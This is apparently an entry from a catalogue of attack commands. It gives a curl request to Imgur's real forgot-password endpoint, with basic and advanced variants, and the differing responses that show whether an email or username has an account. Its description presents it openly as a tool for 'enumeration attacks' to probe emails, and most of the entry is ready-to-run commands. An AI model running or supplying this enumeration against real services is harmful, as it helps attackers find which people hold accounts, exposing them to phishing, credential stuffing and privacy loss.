---
data: >-
  curl -X POST 'https://imgur.com/account/forgot_password' -d
  'email=example@example.com' -H 'Content-Type:
  application/x-www-form-urlencoded'
tags:
  - web
  - enumeration
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 9bbab102-fc0c-4af1-ad6c-a68bd85891a9
created_at: '2025-12-14T17:25:13.144Z'
updated_at: '2025-12-14T17:25:13.144Z'
verified: false
validated: true
submitted: true
---
# curl-imgur-auth-test

## Command

```bash
curl -X POST 'https://imgur.com/account/forgot_password' -d 'email=example@example.com' -H 'Content-Type: application/x-www-form-urlencoded'
```

## Description

This command sends a POST request to Imgur's forgot password endpoint to test for account existence by analyzing the response. Use it to probe emails or usernames in enumeration attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `'https://imgur.com/account/forgot_password'` | Target endpoint URL (adjust for login if needed) | Yes |
| `-d 'email=example@example.com'` | Email parameter to test | Yes |
| `-H 'Content-Type: application/x-www-form-urlencoded'` | Sets the content type for form data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://imgur.com/account/forgot_password' -d 'email=nonexistent@example.com' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Advanced Usage

```bash
curl -s -X POST 'https://imgur.com/account/forgot_password' -d 'email=target@example.com&username=test' -H 'Content-Type: application/x-www-form-urlencoded' -w '%{http_code}'
```

## Expected Output

For non-existent: Response body with "That username or email was not found." and HTTP 200 or 400. For existent: Different message like "Reset link sent" without the specific error.

## Related

- [[Related Procedure|procedures/Imgur-Account-Enumeration-via-Response-Differences]]
